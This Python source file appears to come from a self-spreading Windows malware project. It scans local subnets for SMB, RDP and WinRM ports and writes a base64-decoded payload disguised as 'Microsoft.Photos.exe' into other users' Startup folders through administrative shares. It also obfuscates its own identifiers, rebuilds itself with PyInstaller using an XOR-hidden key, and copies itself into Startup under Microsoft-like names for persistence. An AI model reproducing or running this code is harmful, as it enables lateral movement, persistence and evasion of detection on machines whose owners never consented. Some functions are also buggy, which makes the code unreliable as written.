import base64
import ipaddress
import os
import socket
import random
import sys
import string
import netifaces
from Utils.helpers import random_string,parse_ast,top_level_functions,find_python_path,hide_path
from Persistance.foothold import pip_install
from Encryption.Utils import xor
import re
import copy
import shutil

def get_lan() -> set:
    interfaces = netifaces.interfaces()
    local_ip = set()
    for interface in interfaces:
        if interface == 'lo':
            continue
        iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if iface != None:
            for j in iface:
                addr = str(j['addr'])
                if addr.startswith('192.168') or addr.startswith('172.16'):
                    local_ip.add(addr)
    return local_ip


def get_vuln_ports() -> dict:
    vuln_ports = {'445', '3389', '5985'}
    clients = []
    vuln = dict()
    local_ip = get_lan()
    for addr in local_ip:
        range = ipaddress.ip_network(f"{addr.strip().split('.')[0]}.{addr.strip().split('.')[1]}.1.0/24")
        for ip in range.hosts():
            for port in vuln_ports:
                ip = str(ip)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = s.connect_ex((ip, int(port)))
                if result == 0:
                    if vuln.get(ip):
                        vuln[ip] += f',{port}'
                    else:
                        vuln[ip] = str(port)

    return vuln


def abuse_open_ports():
    smb = '445'
    mstsc = '3389'
    ports = get_vuln_ports()
    for ip, open_ports in ports.items():
        open_ports = open_ports.strip().split(',')
        for port in open_ports:
            if port == smb:
                drop_on_share(ip)
            elif port == mstsc:
                pass
            else:
                pass
    return


def drop_on_share(ip, file,port=445) -> None:
    """

    :param ip: ip to parse
    :param file: base64 dropper
    :param port: 445
    :return: None
    """
    default_shares = [l + '$' for l in string.ascii_uppercase]
    default_shares.append('ADMIN$')
    cl = file
    exclude_users = ['Default', 'Public', 'All']
    for share in default_shares:
        try:
            a = os.chdir(f"//{ip}/{share}")
            if share == 'C$' or 'Users' in os.listdir():
                for user in os.listdir('Users'):
                    if any(i for i in exclude_users not in user):
                        os.makedirs(
                            f"//{ip}/{share}/users/{user}/appdata/roaming/microsoft/windows/start menu/programs/startup/",
                            exist_ok=True)
                        os.chdir(
                            f"//{ip}/{share}/users/{user}/appdata/roaming/microsoft/windows/start menu/programs/startup/")
                        with open('Microsoft.Photos.exe', 'w+') as n:
                            n.write(base64.b64decode(cl).decode())

        except FileNotFoundError:
            continue
    return



def obfuscate_files(files_path):
    """obfuscate_all_files"""
    functions = {}
    vars2 = {}
    replace_it = {'base64': random_string(random.randrange(6, 22)),
                  'shutil': random_string(random.randrange(6, 22)),
                  'winreg': random_string(random.randrange(6, 22)),
                  'threading': random_string(random.randrange(6, 22)),
                  'ctypes': random_string(random.randrange(6, 22)),
                  'string': random_string(random.randrange(6, 22)),
                  'random': random_string(random.randrange(6, 22)),
                  'subprocess': random_string(random.randrange(6, 22)),
                  'platform': random_string(random.randrange(6, 22)),
                  'inspect': random_string(random.randrange(6, 22)),
                  'ipaddress': random_string(random.randrange(6, 22)),
                  'socket': random_string(random.randrange(6, 22)),
                  'psutil': random_string(random.randrange(6, 22)),
                  'requests': random_string(random.randrange(6, 22)),
                  'netifaces': random_string(random.randrange(6, 22)),
                  }
    for file in os.listdir(files_path):
        with open(file, 'w+') as rep:
            code = rep.read()
            for k, val in replace_it.items():
                code = code.replace(f'import {k}', f'import {k} as {val}')
                code = code.replace(k, val)
                code = code.replace(f'import {val} as {val}', f'import {k} as {val}')
            tree = parse_ast(code)
            for func in top_level_functions(tree.body):
                if not functions.get(func):
                    functions[func] = random_string(random.randrange(5, 22))
            for k, value in globals().items():
                if len(k) > 5:
                    if not vars2.get(k):
                        vars2[k] = random_string(random.randrange(5, 22))
            for k, v in functions.items():
                if 'main' not in k.name and k.name != 'main':
                    code = code.replace(k.name, v)

def replicate():
    global application_path, temp_dir
    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle, the PyInstaller bootloader
        # extends the sys module by a flag frozen=True and sets the app
        # path into variable _MEIPASS'.
        application_path = sys.executable
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    temp_dir = f"c:/users/{os.getlogin()}/appdata/Local/Temp/{random_string(random.randrange(3, 20))}/"
    temp_path = f"{temp_dir}/{random_string(random.randrange(3, 8))}.py"
    temp_entry = f"{temp_dir}/{random_string(random.randrange(3, 12))}.py"
    temp_file = temp_path.split('/')[-1]
    source_code = ""  # base32 + base64 + base 64
    os.makedirs(os.path.dirname(temp_path), exist_ok=True)
    hide_path(temp_dir)
    replace_it = {'base64': random_string(random.randrange(6, 22)),
                  'shutil': random_string(random.randrange(6, 22)),
                  'winreg': random_string(random.randrange(6, 22)),
                  'threading': random_string(random.randrange(6, 22)),
                  'ctypes': random_string(random.randrange(6, 22)),
                  'string': random_string(random.randrange(6, 22)),
                  'random': random_string(random.randrange(6, 22)),
                  'subprocess': random_string(random.randrange(6, 22)),
                  'platform': random_string(random.randrange(6, 22)),
                  'inspect': random_string(random.randrange(6, 22)),
                  'ipaddress': random_string(random.randrange(6, 22)),
                  'socket': random_string(random.randrange(6, 22)),
                  'psutil': random_string(random.randrange(6, 22)),
                  'requests': random_string(random.randrange(6, 22)),
                  'netifaces': random_string(random.randrange(6, 22)),
                  }
    pip_install()
    ddd = 0
    with open(temp_path, 'w+') as rep:
        code = copy.deepcopy(source_code)
        old_code = copy.deepcopy(code)
        code = base64.b64decode(code).decode()
        for k, val in replace_it.items():
            code = code.replace(f'import {k}', f'import {k} as {val}')
            code = code.replace(k, val)
            code = code.replace(f'import {val} as {val}', f'import {k} as {val}')
        tree = parse_ast(code)
        functions = {}
        vars2 = {}
        for func in top_level_functions(tree.body):
            if not functions.get(func):
                functions[func] = random_string(random.randrange(5, 22))
        for k, value in globals().items():
            if len(k) > 5:
                if not vars2.get(k):
                    vars2[k] = random_string(random.randrange(5, 22))
        for k, v in functions.items():
            if 'main' not in k.name and k.name != 'main':
                code = code.replace(k.name, v)
        new_code = copy.deepcopy(code)
        new_code = base64.b64encode(new_code.encode()).decode()
        is_base32_in_code = re.search(r"^.+\"([A-Z2-7=]{8})+\"$", code, re.MULTILINE)
        if is_base32_in_code:
            match = is_base32_in_code.group(0).strip().split('source_code = ')[1].strip()
            code = code.replace(match, f'"{new_code}"')
        rep.write(code)
        # todo --> add cythonizing!
        Ko = xor(b"\x06\x00DB\x00\nxva.\x06\x1e\x06\x15pM]HX", base64.b32decode(base64.b32decode(base64.b32decode(
            "JJFEYRSRK5BVAR22JJKTMURSJJDVEQ2FGJJUWTCJIZDEIS2XJNEUSTJTIZDVCU2RJFFE2RSRKFFFIS2FGZIT2PJ5HU======")))).decode()
    pyinstaller = os.path.join(find_python_path(), 'Scripts/pyinstaller.exe')
    hidden_imports = "LS1oaWRkZW4taW1wb3J0PWNyeXB0b2dyYXBoeSAtLWhpZGRlbi1pbXBvcnQ9cmVxdWVzdHMgLS1oaWRkZW4taW1wb3J0PWNyeXB0b2dyYXBoeS5mZXJuZXQgLS1oaWRkZW4taW1wb3J0PWNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMgLS1oaWRkZW4taW1wb3J0PWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyAtLWhpZGRlbi1pbXBvcnQ9Y3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmtkZi5wYmtkZjIgLS1oaWRkZW4taW1wb3J0PW5ldGlmYWNlcyAtLWhpZGRlbi1pbXBvcnQ9cHN1dGls"

    with open(temp_path, 'w+') as nf:
        nf.truncate()
        nf.write(code)
    g = os.system(
        f'cd {temp_dir} && {pyinstaller} {base64.b64decode(hidden_imports.encode()).decode()} --key={Ko} --icon=NONE  --onefile {temp_file}')
    if os.path.exists(
            f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/Microsoft.Photos.exe"):
        shutil.copy(f"{temp_dir}/dist/{temp_file.replace('.py', '.exe')}",
                    f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/WindowsStore{random_string(random.randrange(5, 14))}.exe")
    else:
        shutil.copy(f"{temp_dir}/dist/{temp_file.replace('.py', '.exe')}",
                    f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/Microsoft.Photos.exe")
    with open(temp_path, 'w+') as nf:
        nf.truncate(0)
    shutil.rmtree(temp_dir)

    return 0
